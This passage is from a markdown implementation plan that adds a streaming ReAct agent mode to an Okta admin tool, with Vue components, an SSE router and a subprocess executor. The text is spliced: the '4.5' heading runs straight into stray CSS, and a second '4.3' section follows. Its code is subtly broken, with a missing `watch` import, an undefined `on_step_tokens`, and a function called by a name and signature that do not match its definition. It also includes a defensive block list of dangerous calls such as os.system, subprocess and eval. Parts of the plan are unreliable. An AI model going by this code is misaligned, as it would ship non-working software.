            if (activeEventSource.value) {
                activeEventSource.value.close()
                activeEventSource.value = null
            }
        } catch (err) {
            console.error("Error cancelling ReAct process:", err)
        }
    }

    /**
     * Cleanup
     */
    const cleanup = () => {
        if (activeEventSource.value) {
            activeEventSource.value.close()
            activeEventSource.value = null
        }
        isStreaming.value = false
        isProcessing.value = false
        isLoading.value = false
        error.value = null
        processId.value = null

        execution.status = "idle"
        execution.discoverySteps = []
        execution.currentStep = null
        execution.currentReasoning = null
        execution.generatedCode = null
        execution.results = null
        execution.tokenUsage = null
    }

    return {
        // State
        isLoading,
        isProcessing,
        isStreaming,
        error,
        processId,
        ...toRefs(execution),

        // Methods
        startProcess,
        connectToStream,
        cancelProcess,
        cleanup
    }
}
```

---

#### **4.2 Enhanced UI Components for Thinking Process**

**Design Philosophy:**
- **v-timeline** - Better than accordion for sequential thinking steps
- **Real-time text streaming** - Show thinking as it happens (typewriter effect in composable)
- **Visual progress** - Circular progress for each step
- **Chip badges** - Show step status (running, completed, error)
- **Smooth animations** - Professional feel during discovery

**Recommended Vuetify Components:**

1. **v-timeline** - Perfect for sequential ReAct steps (7 discovery steps)
2. **v-timeline-item** - Each thinking step with icon + color coding
3. **v-chip** - Step status badges (running, completed, tokens)
4. **v-progress-circular** - Step-level progress indicators
5. **v-expansion-panels** - Optional: Expand step for details
6. **v-skeleton-loader** - Placeholder while waiting for next step
7. **v-card** - Container for each step with elevation
8. **v-divider** - Separate discovery phase from execution

**Visual Hierarchy Example:**
```
┌─────────────────────────────────────────────┐
│  ReAct Agent - Analyzing Query              │
│  ━━━━━━━━━━━━━━━━━ 57% (4/7 steps)         │
└─────────────────────────────────────────────┘

Timeline (Left border + icons):
  
  ● ✓ Step 1: Load API endpoints         (2.3s) [123 tokens]
      "Loading API catalog from SQLite..."
  
  ● ✓ Step 2: Filter operations          (1.8s) [89 tokens]
      "Filtering endpoints for user management..."
  
  ● ✓ Step 3: Get code prompt            (0.5s) [45 tokens]
      "Analyzing query requirements..."
  
  ● ⟳ Step 4: Probe group API            (running...)
      "Testing /api/v1/groups endpoint..."
      ━━━━━━━━━░░░░░░░░░░ 40%
  
  ○ Step 5: Probe members API            (waiting...)
  ○ Step 6: Probe user details           (waiting...)
  ○ Step 7: Generate code                (waiting...)

[Stop Processing] button (with circular progress)
```

#### **4.3 Create ReActThinkingSteps.vue Component**

**NEW FILE:** `src/frontend/src/components/messages/ReActThinkingSteps.vue`

**Purpose:** Display ReAct agent thinking process (similar to Tako's multi-agent step display in ChatInterfaceV2)

**Key Points:**
- **Reuse ChatInterfaceV2.vue** - Don't create new chat interface!
- **Reuse DataDisplay.vue** - Already handles results perfectly!
- **Only create this new component** - Shows thinking steps during discovery phase
- **Drop it into ChatInterfaceV2** - Between search bar and results

**Component with Vuetify Timeline:**

```vue
<template>
    <!-- Compact thinking steps display - drops into ChatInterfaceV2 between search and results -->
    <div v-if="steps && steps.length > 0" class="react-thinking-container">
        <!-- Collapsible header -->
        <v-card class="thinking-header" elevation="1" @click="isExpanded = !isExpanded">
            <v-card-text class="d-flex align-center gap-3 py-3">
                <v-icon :class="['expand-icon', { expanded: isExpanded }]" size="small">
                    mdi-chevron-right
                </v-icon>
                <v-icon color="primary">mdi-brain</v-icon>
                <div class="flex-grow-1">
                    <span class="text-subtitle-2">ReAct Discovery</span>
                    <span class="text-caption text-grey ml-2">
                        ({{ completedSteps }} / {{ steps.length }} steps)
                    </span>
                </div>
                <v-chip v-if="isRunning" color="primary" size="small" variant="tonal">
                    Processing...
                </v-chip>
                <v-chip v-else-if="isCompleted" color="success" size="small" variant="tonal">
                    Completed
                </v-chip>
            </v-card-text>
        </v-card>

        <!-- Expandable timeline (collapsed by default once complete) -->
        <v-expand-transition>
            <div v-show="isExpanded" class="thinking-timeline-wrapper">
                <!-- Discovery Steps Timeline -->
                <v-timeline side="end" align="start" class="thinking-timeline">
                    <v-timeline-item
                        v-for="(step, idx) in steps"
                        :key="idx"
                        :dot-color="getStepColor(step.status)"
                        :icon="getStepIcon(step.status)"
                        size="x-small"
                        fill-dot
                    >
                        <!-- Step number on left -->
                        <template v-slot:opposite>
                            <div class="text-caption text-grey">
                                {{ step.number }}
                            </div>
                        </template>

                        <!-- Step content -->
                        <div class="step-content">
                            <!-- Step name and status -->
                            <div class="d-flex align-center gap-2 mb-1">
                                <span class="text-body-2 font-weight-medium">{{ step.name }}</span>
                                <v-chip 
                                    v-if="step.duration"
                                    color="grey"
                                    size="x-small"
                                    variant="text"
                                >
                                    {{ formatDuration(step.duration) }}
                                </v-chip>
                            </div>

                            <!-- Thinking text -->
                            <div class="thinking-text text-caption">
                                <span class="typewriter-text">{{ step.streamingText || step.text }}</span>
                                <span v-if="step.status === 'running' && step.streamingText !== step.text" 
                                    class="typing-cursor">▊</span>
                            </div>

                            <!-- Progress bar (for subprocess execution) -->
                            <v-progress-linear
                                v-if="step.progress"
                                :model-value="step.progress.percentage"
                                color="success"
                                height="4"
                                rounded
                                class="mt-2"
                            />
                        </div>
                    </v-timeline-item>
                </v-timeline>
            </div>
        </v-expand-transition>
    </div>
</template>

<script setup>
import { ref, computed } from 'vue'

/**
 * Props from parent (ChatInterfaceV2 or wherever this component is used)
 */
const props = defineProps({
    steps: {
        type: Array,
        default: () => []
    },
    isRunning: {
        type: Boolean,
        default: false
    }
})

// Local state
const isExpanded = ref(true) // Auto-expand while running

// Watch for completion to auto-collapse
watch(() => props.isRunning, (running) => {
    if (!running && props.steps.length > 0) {
        // Auto-collapse when done
        setTimeout(() => {
            isExpanded.value = false
        }, 2000)
    } else if (running) {
        // Auto-expand while running
        isExpanded.value = true
    }
})

// Computed
const completedSteps = computed(() => 
    props.steps.filter(s => s.status === 'completed').length
)

const isCompleted = computed(() => 
    !props.isRunning && props.steps.length > 0 && 
    completedSteps.value === props.steps.length
)

/**
 * Get step color based on status
 */
const getStepColor = (status) => {
    switch (status) {
        case 'completed': return 'success'
        case 'running': return 'primary'
        case 'error': return 'error'
        default: return 'grey-lighten-2'
    }
}

/**
 * Get step icon based on status
 */
const getStepIcon = (status) => {
    switch (status) {
        case 'completed': return 'mdi-check'
        case 'running': return 'mdi-loading mdi-spin'
        case 'error': return 'mdi-alert-circle'
        default: return 'mdi-circle-outline'
    }
}

/**
 * Get chip color based on status
 */
const getStepChipColor = (status) => {
    switch (status) {
        case 'completed': return 'success'
        case 'running': return 'primary'
        case 'error': return 'error'
        default: return 'grey'
    }
}

/**
 * Format duration in seconds
 */
const formatDuration = (ms) => {
    const seconds = (ms / 1000).toFixed(1)
    return `${seconds}s`
}
</script>

<style scoped>
.react-thinking-container {
    max-width: 1200px;
    margin: 20px auto;
}

.thinking-header {
    cursor: pointer;
    transition: all 0.2s ease;
}

.thinking-header:hover {
    background-color: #f5f5f5;
}

.expand-icon {
    transition: transform 0.3s ease;
}

.expand-icon.expanded {
    transform: rotate(90deg);
}

.thinking-timeline-wrapper {
    padding: 16px 24px;
    background: #fafafa;
    border-radius: 0 0 8px 8px;
}

.thinking-timeline {
    max-width: 100%;
}

.step-content {
    padding: 8px 0;
}

.thinking-text {
    color: #666;
    line-height: 1.5;
}

.typewriter-text {
    display: inline;
}

.typing-cursor {
    display: inline-block;
    width: 2px;
    height: 14px;
    background-color: var(--primary, #4C64E2);
    animation: blink 1s steps(2) infinite;
    margin-left: 2px;
}

@keyframes blink {
    50% { opacity: 0; }
}
</style>
```

---

#### **4.4 Use Component in ChatInterfaceV2.vue**

**Modify:** `src/frontend/src/components/ChatInterfaceV2.vue`

**Add the component between question header and results display:**

```vue
<template>
    <AppLayout contentClass="chat-content">
        <main class="content-area mt-10" :class="{ 'has-results': hasResults }">
            <!-- Existing search container... -->
            
            <!-- Display User question -->
            <transition name="fade">
                <div v-if="hasResults && lastQuestion" class="question-header-container">
                    <!-- ...existing question header... -->
                </div>
            </transition>

            <!-- NEW: ReAct Thinking Steps (only shown for ReAct mode) -->
            <ReActThinkingSteps 
                v-if="isReActMode && reactSteps.length > 0"
                :steps="reactSteps"
                :isRunning="isLoading"
            />

            <!-- Results Area (existing DataDisplay) -->
            <transition name="fade-up">
                <div v-if="hasResults && !isLoading" class="results-container">
                    <DataDisplay 
                        :type="currentResponse.type" 
                        :content="currentResponse.content"
                        :metadata="currentResponse.metadata" 
                    />
                </div>
            </transition>
        </main>
    </AppLayout>
</template>

<script setup>
import { ref, computed } from 'vue'
import DataDisplay from '@/components/messages/DataDisplay.vue'
import ReActThinkingSteps from '@/components/messages/ReActThinkingSteps.vue' // NEW
import AppLayout from '@/components/layout/AppLayout.vue'

// Existing state...
const isReActMode = ref(false) // Set based on mode selector
const reactSteps = ref([])      // NEW: Array of ReAct steps

// When receiving SSE events for ReAct mode
const handleReActStepStart = (content) => {
    reactSteps.value.push({
        number: content.step_number,
        name: content.step_name,
        status: 'running',
        text: content.thinking_text || '',
        streamingText: '',
        startTime: Date.now()
    })
    
    // Trigger typewriter animation (from useReactStream pattern)
    const step = reactSteps.value[reactSteps.value.length - 1]
    animateThinkingText(step)
}

const handleReActStepEnd = (content) => {
    const step = reactSteps.value.find(s => s.number === content.step_number)
    if (step) {
        step.status = 'completed'
        step.endTime = Date.now()
        step.duration = step.endTime - step.startTime
    }
}

// Typewriter animation
const animateThinkingText = (step) => {
    const fullText = step.text
    let currentIndex = 0
    
    const interval = setInterval(() => {
        if (currentIndex < fullText.length) {
            step.streamingText = fullText.substring(0, currentIndex + 1)
            currentIndex++
        } else {
            step.streamingText = fullText
            clearInterval(interval)
        }
    }, 20) // 20ms per character
}

// Rest of existing ChatInterfaceV2 code...
</script>
```

---

#### **4.5 Integrate into App.vue Mode Selector**
}

.results-display {
    margin-top: 24px;
}

.generated-code pre,
.execution-output pre {
    background: #f5f5f5;
    padding: 16px;
    border-radius: 8px;
    overflow-x: auto;
    font-size: 13px;
}

.token-usage {
    display: flex;
    gap: 12px;
    padding: 12px;
    background: #f5f7ff;
    border-radius: 8px;
    margin-top: 16px;
    font-size: 14px;
}
</style>
```

---

#### **4.3 Mode Detection in ChatInterfaceV2**

**No App.vue Changes Needed** - Mode detection can be done via:
- Query parameter: `?mode=react`
- localStorage setting
- User preference from backend

ChatInterfaceV2.vue will detect mode and render appropriate UI components (covered in Phase 4 section above).

---

### **Frontend Implementation Summary**

**New Files Required:**
1. `src/frontend/src/composables/useReactStream.js` - ReAct SSE handler (~300 lines)
2. `src/frontend/src/components/messages/ReActThinkingSteps.vue` - Timeline component (~150 lines)

**Modified Files:**
- `src/frontend/src/components/ChatInterfaceV2.vue` - Add mode detection + ReActThinkingSteps component (~30 lines)

**Reused (No Changes):**
- `DataDisplay.vue` - Already handles streaming results perfectly
- `AppLayout.vue` - Layout container
- Auth composables - Authentication logic

---

## Event Flow Summary

### **Discovery Steps (Steps 1-7) - Thinking Text Only**

**What UI Shows (from CLI output):**
```
🎯 STARTING: STEP 1: Load API endpoints list
💭 Reasoning: Need to determine available API operations for groups, users, apps, and roles...

🎯 STARTING: STEP 2: Identify optimal API endpoints
💭 Reasoning: Goal is to use most efficient, server-side filtering...

🎯 STARTING: STEP 3: Get API code generation prompt
💭 Reasoning: Need detailed API code generation guidance...

🎯 STARTING: STEP 4: Probe the /api/v1/groups endpoint
💭 Reasoning: Start with simplest probe using ?q=sso-super-admins...

🎯 STARTING: STEP 5: Probe /api/v1/groups/{groupId}/users
💭 Reasoning: Now have groupId, need to probe group members...

🎯 STARTING: STEP 6A/6B/6C: Probe user endpoints (parallel)
💭 Reasoning: Fetch sample apps, groups, roles for structure...

🎯 STARTING: STEP 7: Synthesize final execution plan
💭 Reasoning: All probe results obtained, ready to generate script...

🎯 STARTING: STEP 8: Generate complete production Python script
💭 Reasoning: Build final script with API calls, concurrency, progress tracking...

✅ SYNTHESIS COMPLETE: Generated final production code (7902 chars)
```

**What UI Does NOT See:**
- Actual probe query code (shown in DEBUG logs only)
- Sample JSON responses (agent context only)
- Field names learned from probes
- `__PROGRESS__` events during probes (those are internal)

**How It Works:**
- `log_progress` tool emits "🎯 STARTING" and "💭 Reasoning" via `step_start_callback`
- These become `STEP-START` SSE events with `step_name` and `query_context`
- Frontend shows these in expansion panel (same as Tako steps)
- Probe results stay in agent's context, NOT streamed to UI

---

### **Execution Step (Step 8)**

**UI Sees:**
```
Step 8: Validating code security... ✓
Step 9: Executing production script...
    → [PROGRESS] Searching for group: sso-super-admins (API-only mode)
    → [PROGRESS] Found group 'sso-super-admins' with id: 00gssw5stpACdPAty697
    → [PROGRESS] Retrieving group members via API...
    → [PROGRESS] Found 15 users in group 'sso-super-admins'
    → [PROGRESS] Fetching app assignments, groups, and roles for all users (batch size: 10)...
    → [PROGRESS] entity_start: sso-super-users (15 total)
    → [PROGRESS] entity_progress: sso-super-users (10/15 - 66%)
    → [PROGRESS] entity_progress: sso-super-users (15/15 - 100%)
    → [PROGRESS] entity_complete: sso-super-users (success)
    → [PROGRESS] CSV results saved to: sso_super_admins_audit_20251114_093045.csv
    → [PROGRESS] Total group members processed: 15
    ✓ Completed in 12.3s
```

**How It Works (Using Proven Pattern from modern_execution_manager.py):**
- Generated script prints `__PROGRESS__ {...}` to stderr
- `_execute_subprocess_with_streaming` captures stderr in real-time
- Parses JSON events: entity_start, entity_progress, entity_complete
- Emits SSE events via subprocess_progress_callback
- Frontend shows incremental progress, not just "Executing..."

**Results Display:**
- CSV file saved to: `src/core/data/sso_super_admins_audit_20251114_093045.csv`
- Total records: 15 users processed
- Execution time: 12.3s
- Token usage: 206K input / 4.6K output

---

## Security Validation Details

**Checks Performed:**

1. **Import Whitelist:**
   - ✅ Allowed: `asyncio`, `sys`, `pathlib`, `datetime`, `dotenv`, `csv`
   - ✅ Allowed: `src.core.okta.client.base_okta_api_client`
   - ❌ Blocked: `os.system`, `subprocess`, `eval`, `exec`, `__import__`

2. **API Endpoint Validation:**
   - ✅ Must start with `/api/v1/`
   - ❌ No external URLs (`http://`, `https://`)

3. **File Operations:**
   - ✅ Write only to `src/core/data/`
   - ❌ No reads from sensitive paths
   - ❌ No path traversal (`../`)

4. **Code Patterns:**
   - ❌ No `eval()` or `exec()` calls
   - ❌ No shell command execution
   - ❌ No network requests outside Okta client

---

## Complete File Structure & Dependencies

### **Backend Files (7 files total)**

```
src/
├── api/
│   ├── main.py                          [MODIFY - Register react_stream router]
│   └── routers/
│       ├── realtime_hybrid.py           [REFERENCE - SSE pattern, callbacks, ProcessStatus]
│       └── react_stream.py              [NEW - ReAct SSE router (500 lines)]
│
├── core/
│   ├── agents/
│   │   ├── one_react_agent.py           [MODIFY - Add 4 callback fields + emit events]
│   │   └── one_react_agent_executor.py  [NEW - Wrapper: discovery→validation→exec (300 lines)]
│   │
│   ├── orchestration/
│   │   └── modern_execution_manager.py  [REFERENCE - _execute_subprocess_with_streaming() line 3352+]
│   │
│   └── security/
│       ├── code_security_validator.py   [REFERENCE - validate_generated_code()]
│       └── dependencies.py              [REFERENCE - get_current_user()]
```

**Key Backend Insights:**
1. **Copy SSE pattern from `realtime_hybrid.py`** - Same `EventSourceResponse`, event types, callback structure
2. **Reuse subprocess pattern from `modern_execution_manager.py`** - Proven `__PROGRESS__` parsing from stderr
3. **Don't modify Tako's router** - Clean separation prevents breaking existing functionality
4. **Security validation reuses existing code** - `validate_generated_code()` checks imports/endpoints/paths

---

### **Frontend Files (4 files total)**

```
src/frontend/src/
├── composables/
│   ├── useRealtimeStream.js             [REFERENCE - Event handling, connection pattern]
│   └── useReactStream.js                [NEW - Simplified SSE handler (~300 lines)]
│
└── components/
    ├── ChatInterfaceV2.vue              [MODIFY - Add ReActThinkingSteps + mode detection (~30 lines)]
    │
    └── messages/
        ├── DataDisplay.vue              [SHARED - NO CHANGES NEEDED! ✅]
        └── ReActThinkingSteps.vue       [NEW - Collapsible timeline (~150 lines)]
```

**Key Frontend Insights:**
1. **`DataDisplay.vue` is already reusable** - Handles table streaming, markdown, JSON, errors, CSV download
2. **`useReactStream.js` is simpler than `useRealtimeStream.js`** - No plan generation, no expansion panels complexity
3. **`ChatInterfaceV2.vue` modified minimally** - Just add mode detection + ReActThinkingSteps component (~30 lines)
4. **`ReActThinkingSteps.vue` is self-contained** - Collapsible timeline with all display logic
5. **Event format matches Tako** - Same `STEP-START`, `STEP-END`, `STEP-PROGRESS`, `COMPLETE` types

**DataDisplay.vue Already Handles:**
- ✅ Table with streaming progress (`isStreaming`, `streamingProgress.current/total`)
- ✅ Markdown rendering (for text responses)
- ✅ JSON display (pretty-printed)
- ✅ Error messages (styled alerts)
- ✅ CSV download button
- ✅ Data source info (realtime vs DB)

**No DataDisplay Changes Needed!** Just ensure ReAct composable returns:
```javascript
execution.results = {
    content: [...],  // Array of objects for table
    display_type: "table",  // or "markdown", "json"
    metadata: {
        headers: [{text: "Email", value: "email"}, ...],
        isStreaming: true,  // While subprocess executes
        streamingProgress: {current: 10, total: 15}  // From __PROGRESS__ events
    }
}
```

---

## Implementation Checklist

### **Phase 1: Backend - Add SSE Callbacks to ReAct Agent** (1.5 hours)

#### **File: `src/core/agents/one_react_agent.py` [MODIFY]**

- [ ] **1.1** Add 3 new callback fields to `ReactAgentDependencies` dataclass (line ~547):
  ```python
  # Note: progress_callback already exists at line 542
  # Add these new SSE-specific callbacks:
  step_start_callback: Optional[callable] = None
  step_end_callback: Optional[callable] = None
  step_tokens_callback: Optional[callable] = None
  ```

- [ ] **1.2** Update `log_progress` tool to emit `STEP-START` events (line ~800):
  ```python
  async def log_progress(action: str, reasoning: str, status: str):
      """Log ReAct progress step - NOW WITH SSE CALLBACK"""
      # Existing debug logging
      logger.debug(f"[{ctx.deps.correlation_id}] 🎯 {status.upper()}: {action}")
      logger.debug(f"[{ctx.deps.correlation_id}] 💭 Reasoning: {reasoning}")
      
      # NEW: Emit SSE event for discovery steps
      if ctx.deps.step_start_callback and status == "starting":
          await ctx.deps.step_start_callback(
              step_number=ctx.deps.current_step,
              step_type="react_discovery",  # Type for UI stepper
              step_name=action,  # "🎯 STARTING: Load API endpoints"
              query_context=reasoning,  # "💭 Reasoning: Need to determine..."
              critical=False,  # Discovery steps not critical
              formatted_time=time.strftime('%H:%M:%S')
          )
          ctx.deps.current_step += 1
      
      return action  # Return for agent continuation
  ```

- [ ] **1.3** Update `execute_test_query` tool to emit `STEP-END` events (line ~950):
  ```python
  # After probe execution completes
  end_time = time.time()
  elapsed = end_time - start_time
  
  # NEW: Emit STEP-END event (probe complete)
  if ctx.deps.step_end_callback:
      await ctx.deps.step_end_callback(
          step_number=ctx.deps.current_step - 1,  # Last started step
          step_type="react_discovery",
          success=True,
          duration_seconds=elapsed,
          record_count=len(probe_results),  # Sample count (hidden from UI)
          formatted_time=time.strftime('%H:%M:%S')
      )
  ```

- [ ] **1.4** Test callbacks with console output:
  ```bash
  # Run test script with console callback print
  python scripts/okta_react_agent_test.py --query "list all users" --debug
  
  # Expected output:
  # STEP-START: Step 1 - react_discovery - "🎯 STARTING: Load API endpoints"
  # STEP-END: Step 1 - Success (0.5s, 3 samples)
  # STEP-START: Step 2 - react_discovery - "🎯 STARTING: Identify optimal endpoints"
  # ...
  ```

---

### **Phase 2: Backend - Create Execution Wrapper** (2 hours)

#### **File: `src/core/agents/one_react_agent_executor.py` [NEW]**

- [ ] **2.1** Create file with imports and structure:
  ```python
  """
  ReAct Agent Execution Wrapper with SSE Streaming
  
  Workflow:
  1. Discovery Phase: ReAct agent with callbacks (Steps 1-7)
  2. Synthesis Phase: Code generation (Step 8)
  3. Validation Phase: Security scan (Step 9)
  4. Execution Phase: Subprocess with progress (Step 10)
  5. Results Phase: Return formatted output
  """
  import asyncio
  import sys
  import json
  import time
  from pathlib import Path
  from typing import Dict, Any, Optional, Callable
  
  from src.core.agents.one_react_agent import (
      execute_react_query, 
      ReactAgentDependencies
  )
  from src.core.security.code_security_validator import validate_generated_code
  from src.utils.logging import get_logger
  
  logger = get_logger("okta_ai_agent")
  ```

- [ ] **2.2** Implement main execution function:
  ```python
  async def execute_react_query_with_streaming(
      query: str,
      step_start_callback: Callable,
      step_end_callback: Callable,
      step_tokens_callback: Callable,
      subprocess_progress_callback: Callable,
      correlation_id: str
  ) -> Dict[str, Any]:
      """
      Execute ReAct query with streaming callbacks.
      Returns formatted results compatible with DataDisplay.vue.
      """
      logger.info(f"[{correlation_id}] Starting ReAct execution with streaming")
      
      try:
          # Phase 1: Discovery (ReAct agent handles with callbacks)
          result, usage = await execute_react_query(
              query=query,
              correlation_id=correlation_id,
              deps=ReactAgentDependencies(
                  step_start_callback=step_start_callback,
                  step_end_callback=step_end_callback,
                  step_tokens_callback=step_tokens_callback
              )
          )
          
          # Phase 2: Security Validation
          await _validate_generated_code(
              code=result.code,
              correlation_id=correlation_id,
              step_start_callback=step_start_callback,
              step_end_callback=step_end_callback
          )
          
          # Phase 3: Subprocess Execution
          execution_result = await _execute_script_with_streaming(
              code=result.code,
              correlation_id=correlation_id,
              subprocess_progress_callback=subprocess_progress_callback
          )
          
          # Phase 4: Format results for DataDisplay
          return _format_results_for_ui(execution_result, usage)
          
      except Exception as e:
          logger.error(f"[{correlation_id}] ReAct execution failed: {e}")
          raise
  ```

- [ ] **2.3** Add security validation helper:
  ```python
  async def _validate_generated_code(
      code: str,
      correlation_id: str,
      step_start_callback: Callable,
      step_end_callback: Callable
  ):
      """Validate generated code security before execution"""
      start_time = time.time()
      
      # Emit STEP-START for validation
      await step_start_callback(
          step_number=8,
          step_type="security_validation",
          step_name="Validating generated code security",
          query_context="Checking for malicious imports, blocked URLs, dangerous operations",
          critical=True,  # Critical step - blocks execution if fails
          formatted_time=time.strftime('%H:%M:%S')
      )
      
      # Run validation (reuse existing code)
      validation_result = validate_generated_code(code)
      
      if not validation_result["valid"]:
          error_msg = f"Security validation failed: {validation_result['issues']}"
          logger.error(f"[{correlation_id}] {error_msg}")
          
          # Emit STEP-END with failure
          await step_end_callback(
              step_number=8,
              step_type="security_validation",
              success=False,
              duration_seconds=time.time() - start_time,
              record_count=0,
              formatted_time=time.strftime('%H:%M:%S'),
              error_message=error_msg
          )
          raise SecurityError(error_msg)
      
      # Emit STEP-END success
      await step_end_callback(
          step_number=8,
          step_type="security_validation",
          success=True,
          duration_seconds=time.time() - start_time,
          record_count=0,
          formatted_time=time.strftime('%H:%M:%S')
      )
      
      logger.info(f"[{correlation_id}] Security validation passed")
  ```

- [ ] **2.4** Add subprocess execution (copy pattern from `modern_execution_manager.py:3352+`):
  ```python
  async def _execute_subprocess_with_streaming(
      script_path: Path,
      progress_callback: Callable,
      correlation_id: str,
      timeout_seconds: int = 180
  ):
      """
      Execute script in subprocess with progress streaming.
      Parses __PROGRESS__ events from stderr.
      """
      logger.info(f"[{correlation_id}] Starting subprocess execution")
      
      proc = await asyncio.create_subprocess_exec(
          sys.executable, str(script_path),
          stdout=asyncio.subprocess.PIPE,
          stderr=asyncio.subprocess.PIPE,
          limit=1024*1024*5  # 5MB buffer
      )
      
      stdout_lines = []
      
      async def read_stdout(stream, line_list):
          """Capture stdout for final results"""
          while True:
              line = await stream.readline()
              if not line:
                  break
              line_list.append(line.decode('utf-8').strip())
      
      async def read_stderr_with_callback(stream, callback):
          """Parse __PROGRESS__ events from stderr"""
          while True:
              line = await stream.readline()
              if not line:
                  break
              decoded_line = line.decode('utf-8').strip()
              
              # Check for progress events
              if decoded_line.startswith("__PROGRESS__"):
                  json_str = decoded_line.replace("__PROGRESS__", "").strip()
                  try:
                      event_data = json.loads(json_str)
                      await callback(event_data)  # Forward to SSE stream
                  except json.JSONDecodeError as e:
                      logger.warning(f"[{correlation_id}] Failed to parse progress: {e}")
      
      # Run concurrent readers with timeout
      try:
          await asyncio.wait_for(
              asyncio.gather(
                  read_stdout(proc.stdout, stdout_lines),
                  read_stderr_with_callback(proc.stderr, progress_callback)
              ),
              timeout=timeout_seconds
          )
      except asyncio.TimeoutError:
          logger.warning(f"[{correlation_id}] Subprocess timeout, terminating")
          proc.terminate()
          await asyncio.wait_for(proc.wait(), timeout=5.0)
          raise
      
      return_code = await proc.wait()
      
      if return_code != 0:
          error_output = "\n".join(stdout_lines)
          logger.error(f"[{correlation_id}] Subprocess failed: {error_output}")
          raise RuntimeError(f"Script execution failed with code {return_code}")
      
      return "\n".join(stdout_lines)
  ```

- [ ] **2.5** Test execution wrapper standalone:
  ```python
  # Create test: scripts/test_react_executor.py
  async def test_executor():
      result = await execute_react_query_with_streaming(
          query="list all users",
          step_start_callback=lambda **kwargs: print(f"START: {kwargs}"),
          step_end_callback=lambda **kwargs: print(f"END: {kwargs}"),
          step_tokens_callback=lambda **kwargs: print(f"TOKENS: {kwargs}"),
          subprocess_progress_callback=lambda data: print(f"PROGRESS: {data}"),
          correlation_id="test-123"
      )
      print("Result:", result)
  
  asyncio.run(test_executor())
  ```

---

### **Phase 3: Backend - Create React Stream Router** (1.5 hours)

#### **File: `src/api/routers/react_stream.py` [NEW]**

- [ ] **3.1** Copy router structure from `realtime_hybrid.py` (lines 1-100):
  ```python
  """
  React Agent SSE Streaming Router
  
  Separate router for One-ReAct agent with same SSE format as realtime_hybrid.py.
  No frontend changes needed - reuses existing event handlers.
  """
  import asyncio
  import uuid
  import json
  import time
  from typing import Dict, Any
  from enum import Enum
  
  from fastapi import APIRouter, HTTPException, Depends
  from fastapi.responses import JSONResponse
  from pydantic import BaseModel, Field
  from sse_starlette.sse import EventSourceResponse
  
  from src.core.agents.one_react_agent_executor import execute_react_query_with_streaming
  from src.core.security.dependencies import get_current_user
  from src.core.okta.sync.models import AuthUser
  from src.utils.logging import get_logger, set_correlation_id
  
  logger = get_logger("okta_ai_agent")
  
  router = APIRouter(prefix="/react-agent", tags=["react-agent"])
  active_processes: Dict[str, Dict[str, Any]] = {}
  
  class ProcessStatus(str, Enum):
      """Same as realtime_hybrid.py"""
      INITIALIZING = "initializing"
      DISCOVERING = "discovering"
      VALIDATING = "validating"
      EXECUTING = "executing"
      COMPLETED = "completed"
      ERROR = "error"
      CANCELLED = "cancelled"
  ```

- [ ] **3.2** Add request/response models:
  ```python
  class ReactQueryRequest(BaseModel):
      query: str = Field(..., min_length=1, max_length=2000)
  
  class StartProcessResponse(BaseModel):
      process_id: str
      plan: Dict[str, Any]  # Minimal - ReAct has no upfront plan
  
  def create_execution_event(event_type: str, process_id: str, data: Dict[str, Any]) -> str:
      """Create standardized SSE event (same format as Tako)"""
      event = {
          "type": event_type,
          "content": {
              "process_id": process_id,
              "timestamp": time.time(),
              "formatted_time": time.strftime('%H:%M:%S'),
              **data
          }
      }
      return json.dumps(event) + "\n"
  ```

- [ ] **3.3** Implement `/start-react-process` endpoint:
  ```python
  @router.post("/start-react-process")
  async def start_react_process_endpoint(
      request: ReactQueryRequest,
      current_user: AuthUser = Depends(get_current_user)
  ) -> StartProcessResponse:
      """
      Initialize ReAct process (no planning phase - discovers dynamically).
      Returns process_id for streaming connection.
      """
      process_id = str(uuid.uuid4())
      
      active_processes[process_id] = {
          "status": ProcessStatus.INITIALIZING,
          "query": request.query,
          "user": current_user,
          "created_at": time.time(),
          "cancelled": False
      }
      
      logger.info(f"[{process_id}] ReAct process initialized for query: '{request.query}'")
      
      # ReAct has no upfront plan - returns minimal structure
      return StartProcessResponse(
          process_id=process_id,
          plan={"steps": [], "note": "ReAct discovers steps dynamically"}
      )
  ```

- [ ] **3.4** Implement `/stream-react-updates/{process_id}` endpoint:
  ```python
  @router.get("/stream-react-updates/{process_id}")
  async def stream_react_updates_endpoint(
      process_id: str,
      current_user: AuthUser = Depends(get_current_user)
  ):
      """
      Stream ReAct execution updates via SSE.
      Same event format as realtime_hybrid.py for frontend compatibility.
      """
      set_correlation_id(process_id)
      
      if process_id not in active_processes:
          async def not_found_generator():
              yield create_execution_event("ERROR", process_id, {
                  "error": "Process not found",
                  "message": "Invalid or expired process ID"
              })
          return EventSourceResponse(not_found_generator())
      
      proc_data = active_processes[process_id]
      query = proc_data["query"]
      
      async def event_generator():
          try:
              # Update status
              active_processes[process_id]["status"] = ProcessStatus.DISCOVERING
              
              # Event queue for callbacks
              event_queue = asyncio.Queue()
              
              # Define callbacks that emit SSE events
              async def on_step_start(step_number, step_type, step_name, query_context, critical, formatted_time):
                  event = create_execution_event("STEP-START", process_id, {
                      "step_number": step_number,
                      "step_type": step_type,
                      "step_name": step_name,
                      "query_context": query_context,
                      "critical": critical,
                      "formatted_time": formatted_time
                  })
                  await event_queue.put(event)
              
              async def on_step_end(step_number, step_type, success, duration_seconds, record_count, formatted_time, error_message=None):
                  event = create_execution_event("STEP-END", process_id, {
                      "step_number": step_number,
                      "step_type": step_type,
                      "success": success,
                      "duration_seconds": duration_seconds,
                      "record_count": record_count,
                      "formatted_time": formatted_time,
                      "error_message": error_message
                  })
                  await event_queue.put(event)
              
              async def on_subprocess_progress(event_data):
                  event = create_execution_event("STEP-PROGRESS", process_id, event_data)
                  await event_queue.put(event)
              
              # Execute ReAct with callbacks
              async def execute_task():
                  result = await execute_react_query_with_streaming(
                      query=query,
                      step_start_callback=on_step_start,
                      step_end_callback=on_step_end,
                      step_tokens_callback=on_step_tokens,
                      subprocess_progress_callback=on_subprocess_progress,
                      correlation_id=process_id
                  )
                  
                  # Final COMPLETE event
                  await event_queue.put(create_execution_event("COMPLETE", process_id, result))
                  await event_queue.put(None)  # Sentinel
              
              # Start execution in background
              task = asyncio.create_task(execute_task())
              
              # Stream events from queue
              while True:
                  event = await event_queue.get()
                  if event is None:  # Sentinel
                      break
                  yield event
                  await asyncio.sleep(0.01)  # Small delay for streaming
              
              # Update status
              active_processes[process_id]["status"] = ProcessStatus.COMPLETED
              
          except Exception as e:
              logger.error(f"[{process_id}] ReAct execution error: {e}")
              active_processes[process_id]["status"] = ProcessStatus.ERROR
              yield create_execution_event("ERROR", process_id, {
